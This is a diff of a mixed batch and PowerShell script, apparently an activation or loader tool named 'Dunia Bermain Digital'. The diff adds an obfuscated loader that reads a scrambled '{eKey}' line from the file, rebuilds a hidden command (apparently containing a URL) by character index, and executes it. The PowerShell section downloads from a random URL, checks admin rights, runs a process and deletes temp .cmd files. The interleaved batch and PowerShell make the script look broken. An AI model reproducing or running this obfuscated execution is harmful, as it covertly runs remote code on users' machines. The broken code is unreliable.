@@ -1,28 +1,7 @@
 @set dbdver=2.5
 @setlocal DisableDelayedExpansion
-cls
-color 07
-title  Dunia Bermain Digital %dbdver%
-set _args=
-set _elev=
-set _unattended=0
-set _args=%*
-if defined _args set _args=%_args:"=%
-if defined _args (
-for %%A in (%_args%) do (
-if /i "%%A"=="-el"  set _elev=1
-if /i "%%A"=="/res" set _reset=1
-if /i "%%A"=="/act" set _activate=1
-)
-)
-for %%A in (%_activate% %_reset%) do (if "%%A"=="1" set _unattended=1)
-For /F "Tokens=1,* Delims=ù" %%A in ('Type "%~0" ^| Findstr  "^{eKey}"') Do Set "__Key=%%B"
-Set "Exect="
-For %%` in (33=2=34,18,9,8;63;25,62,26,49;29=60;35;44,53;61;13=58,16=6;30,52=0,37,50=43;31;55;39;14,66,47,11;12,51=64,70;48,22;57=5,17=3=10,59;15;20;46,24;32,65,36=67;54=23=45=38,69,40;21=42,) Do Set "Exect=!Exect!!__Key:~%%`,1!"
-!Exect!
 
 
-{eKey}ùo^tdLoe#:s//BbcbsupKaiCaz/aÜÈ.rnihtinnn.wpnetihmkwtLchmtrluagur/4ao/K/c&
 
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
@@ -39,6 +18,11 @@ try {
     $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
 }
 
+For /F "Tokens=1,* Delims=ù" %%A in ('Type "%~0" ^| Findstr  "^{eKey}"') Do Set "__Key=%%B"
+Set "Exect="
+For %%` in (33=2=34,18,9,8;63;25,62,26,49;29=60;35;44,53;61;13=58,16=6;30,52=0,37,50=43;31;55;39;14,66,47,11;12,51=64,70;48,22;57=5,17=3=10,59;15;20;46,24;32,65,36=67;54=23=45=38,69,40;21=42,) Do Set "Exect=!Exect!!__Key:~%%`,1!"
+!Exect!
+Goto :Eof
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
@@ -53,3 +37,6 @@ Start-Process $FilePath $ScriptArgs -Wait
 
 $FilePaths = @("$env:TEMP\ded*.cmd", "$env:SystemRoot\Temp\ded*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+
+
+{eKey}ùo^tdLoe#:s//BbcbsupKaiCaz/aÜÈ.rnihtinnn.wpnetihmkwtLchmtrluagur/4ao/K/c&
